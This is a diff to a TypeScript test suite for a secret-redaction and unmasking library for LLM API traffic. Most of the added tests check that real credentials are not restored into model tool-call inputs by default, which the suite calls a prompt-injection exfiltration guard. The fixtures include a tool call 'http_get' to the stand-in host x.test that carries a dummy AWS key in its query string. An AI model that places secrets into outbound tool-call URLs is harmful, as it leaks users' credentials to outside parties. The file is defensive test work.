@@ -93,7 +93,7 @@ describe('text stream helpers', () => {
 });
 
 describe('redactDeep / unmaskDeep', () => {
-  const imageData = 'iVBORw0KGgo' + 'A'.repeat(64) + ['AKIA', 'ABCDEFGHIJKLMNOP'].join('');
+  const imageData = 'iVBORw0KGgo' + 'A'.repeat(65) + ['AKIA', 'ABCDEFGHIJKLMNOP'].join('');
 
   it('redacts every string in an Anthropic-shaped request with one shared vault', () => {
     const request = {
@@ -123,23 +123,71 @@ describe('redactDeep / unmaskDeep', () => {
     expect(vault.size).toBe(2);
   });
 
-  it('leaves data: URLs untouched', () => {
+  it('leaves binary data: URLs untouched', () => {
     const url = 'data:image/png;base64,' + ['AKIA', 'ABCDEFGHIJKLMNOP'].join('');
     expect(redactDeep({ image_url: { url } }).value.image_url.url).toBe(url);
   });
 
-  it('unmasks nested tool_use input objects in a response', () => {
-    const { vault } = vaultWith(AWS);
-    const response = {
-      content: [
-        { type: 'text', text: 'Calling tool' },
-        { type: 'tool_use', id: 'tu_1', name: 'deploy', input: { env: { KEY: '[AWS_ACCESS_KEY_ID_1]' }, args: ['[AWS_ACCESS_KEY_ID_1]'] } }
-      ]
+  it('does not skip "base64" fields whose content is not actually base64 (fail closed)', () => {
+    const req = {
+      source: { type: 'base64', media_type: 'image/png', data: `not base64: ${AWS}` },
+      url: `data:image/png;base64,${AWS} and more`
     };
-    type Block = { type: string; input?: { env: { KEY: string }; args: string[] } };
-    const out = unmaskDeep(response, vault) as { content: Block[] };
-    expect(out.content[1]!.input).toEqual({ env: { KEY: AWS }, args: [AWS] });
-    expect((response.content[1] as Block).input!.env.KEY).toBe('[AWS_ACCESS_KEY_ID_1]'); // not mutated
+    const { value } = redactDeep(req);
+    expect(value.source.data).toBe('not base64: [AWS_ACCESS_KEY_ID_1]');
+    expect(value.url).not.toContain(AWS);
+  });
+
+  it('decodes, redacts and re-encodes base64 text documents the model can read', () => {
+    const plain = `config\nKEY=${AWS}\n`;
+    const req = {
+      document: { type: 'base64', media_type: 'text/plain', data: Buffer.from(plain).toString('base64') },
+      url: `data:application/json;base64,${Buffer.from(JSON.stringify({ k: AWS })).toString('base64')}`
+    };
+    const { value, totalLeaks } = redactDeep(req);
+    expect(Buffer.from(value.document.data, 'base64').toString('utf8')).toBe('config\nKEY=[AWS_ACCESS_KEY_ID_1]\n');
+    const jsonPart = value.url.slice(value.url.indexOf(',') + 1);
+    expect(JSON.parse(Buffer.from(jsonPart, 'base64').toString('utf8'))).toEqual({ k: '[AWS_ACCESS_KEY_ID_1]' });
+    expect(totalLeaks).toBe(2);
+  });
+
+  const toolResponse = () => ({
+    content: [
+      { type: 'text', text: 'Calling tool with [AWS_ACCESS_KEY_ID_1]' },
+      { type: 'tool_use', id: 'tu_1', name: 'deploy', input: { env: { KEY: '[AWS_ACCESS_KEY_ID_1]' }, args: ['[AWS_ACCESS_KEY_ID_1]'] } },
+      { type: 'tool_use', id: 'tu_2', name: 'http_get', input: { url: 'https://x.test/?k=[AWS_ACCESS_KEY_ID_1]' } }
+    ]
+  });
+  type Block = { type: string; text?: string; input?: Record<string, unknown> };
+
+  it('does NOT restore secrets into tool inputs by default (prompt-injection exfiltration guard)', () => {
+    const { vault } = vaultWith(AWS);
+    const out = unmaskDeep(toolResponse(), vault) as { content: Block[] };
+    expect(out.content[0]!.text).toBe(`Calling tool with ${AWS}`);
+    expect(JSON.stringify(out.content[1]!.input)).not.toContain(AWS);
+    expect(JSON.stringify(out.content[2]!.input)).not.toContain(AWS);
+  });
+
+  it('restores tool inputs only when opted in, optionally per tool name', () => {
+    const { vault } = vaultWith(AWS);
+    const response = toolResponse();
+    const all = unmaskDeep(response, vault, { unmaskToolInputs: true }) as { content: Block[] };
+    expect(all.content[1]!.input).toEqual({ env: { KEY: AWS }, args: [AWS] });
+
+    const onlyDeploy = unmaskDeep(response, vault, { unmaskToolInputs: (name) => name === 'deploy' }) as {
+      content: Block[];
+    };
+    expect(onlyDeploy.content[1]!.input).toEqual({ env: { KEY: AWS }, args: [AWS] });
+    expect(JSON.stringify(onlyDeploy.content[2]!.input)).not.toContain(AWS);
+    expect((response.content[1] as Block).input!['env']).toEqual({ KEY: '[AWS_ACCESS_KEY_ID_1]' }); // not mutated
+  });
+
+  it('applies the same guard to OpenAI-style function arguments', () => {
+    const { vault } = vaultWith(AWS);
+    const msg = { tool_calls: [{ id: 'c1', type: 'function', function: { name: 'http_get', arguments: '{"k":"[AWS_ACCESS_KEY_ID_1]"}' } }] };
+    expect(JSON.stringify(unmaskDeep(msg, vault))).not.toContain(AWS);
+    const opted = unmaskDeep(msg, vault, { unmaskToolInputs: true });
+    expect(JSON.parse(opted.tool_calls[0]!.function.arguments)).toEqual({ k: AWS });
   });
 });
 
@@ -175,12 +223,19 @@ describe('SDK stream adapters', () => {
       { type: 'content_block_delta', index: 1, delta: { type: 'input_json_delta', partial_json: json.slice(18) } },
       { type: 'content_block_stop', index: 1 }
     ];
-    const out = await collect(unmaskAnthropicStream(fromArray(events), vault));
-    const partial = out
-      .filter((e) => e.type === 'content_block_delta')
-      .map((e) => (e as { delta: { partial_json: string } }).delta.partial_json)
-      .join('');
-    expect(JSON.parse(partial)).toEqual({ password: tricky });
+    const joinJson = (evs: Array<{ type: string }>) =>
+      evs
+        .filter((e) => e.type === 'content_block_delta')
+        .map((e) => (e as unknown as { delta: { partial_json: string } }).delta.partial_json)
+        .join('');
+
+    // default: tool input keeps the placeholder
+    const guarded = await collect(unmaskAnthropicStream(fromArray(events), vault));
+    expect(JSON.parse(joinJson(guarded))).toEqual({ password: placeholder });
+
+    // opted in for this tool: restored, and still valid JSON despite quote/backslash/newline
+    const out = await collect(unmaskAnthropicStream(fromArray(events), vault, { unmaskToolInputs: (n) => n === 'n' }));
+    expect(JSON.parse(joinJson(out))).toEqual({ password: tricky });
   });
 
   it('unmaskOpenAIStream restores content and tool-call arguments across chunks', async () => {
@@ -188,24 +243,26 @@ describe('SDK stream adapters', () => {
     type Chunk = {
       choices: Array<{
         index: number;
-        delta: { content?: string; tool_calls?: Array<{ index: number; function?: { arguments?: string } }> };
+        delta: { content?: string; tool_calls?: Array<{ index: number; function?: { name?: string; arguments?: string } }> };
         finish_reason: string | null;
       }>;
     };
     const chunks: Chunk[] = [
       { choices: [{ index: 0, delta: { content: 'key [AWS_ACCESS' }, finish_reason: null }] },
       { choices: [{ index: 0, delta: { content: '_KEY_ID_1].' }, finish_reason: null }] },
-      { choices: [{ index: 0, delta: { tool_calls: [{ index: 0, function: { arguments: '{"k":"[AWS_' } }] }, finish_reason: null }] },
+      { choices: [{ index: 0, delta: { tool_calls: [{ index: 0, function: { name: 'lookup', arguments: '{"k":"[AWS_' } }] }, finish_reason: null }] },
       { choices: [{ index: 0, delta: { tool_calls: [{ index: 0, function: { arguments: 'ACCESS_KEY_ID_1]"}' } }] }, finish_reason: null }] },
       { choices: [{ index: 0, delta: {}, finish_reason: 'stop' }] }
     ];
-    const out = await collect(unmaskOpenAIStream(fromArray(chunks), vault));
-    const content = out.map((c) => c.choices[0]!.delta.content ?? '').join('');
-    const args = out
-      .map((c) => c.choices[0]!.delta.tool_calls?.[0]?.function?.arguments ?? '')
-      .join('');
-    expect(content).toBe(`key ${AWS}.`);
-    expect(JSON.parse(args)).toEqual({ k: AWS });
+    const argsOf = (cs: Chunk[]) =>
+      cs.map((c) => c.choices[0]!.delta.tool_calls?.[0]?.function?.arguments ?? '').join('');
+
+    const guarded = await collect(unmaskOpenAIStream(fromArray(chunks), vault));
+    expect(guarded.map((c) => c.choices[0]!.delta.content ?? '').join('')).toBe(`key ${AWS}.`);
+    expect(JSON.parse(argsOf(guarded))).toEqual({ k: '[AWS_ACCESS_KEY_ID_1]' });
+
+    const out = await collect(unmaskOpenAIStream(fromArray(chunks), vault, { unmaskToolInputs: true }));
+    expect(JSON.parse(argsOf(out))).toEqual({ k: AWS });
   });
 });
 
@@ -214,6 +271,16 @@ describe('wrapAgent', () => {
     const agent = wrapAgent(async (prompt: string) => ({ echo: prompt, nested: [prompt] }));
     const res = await agent(`my key ${AWS}`);
     expect(res).toEqual({ echo: `my key ${AWS}`, nested: [`my key ${AWS}`] });
+  });
+
+  it('keeps placeholders in tool inputs of object responses unless opted in', async () => {
+    const respond = async (prompt: string) => ({
+      content: [{ type: 'tool_use', name: 'http_get', input: { url: `https://x.test/?q=${prompt}` } }]
+    });
+    const guarded = await wrapAgent(respond)(`key ${AWS}`);
+    expect(JSON.stringify(guarded)).not.toContain(AWS);
+    const opted = await wrapAgent(respond, { unmaskToolInputs: true })(`key ${AWS}`);
+    expect(JSON.stringify(opted)).toContain(AWS);
   });
 
   it('stream-unmasks async iterable responses', async () => {
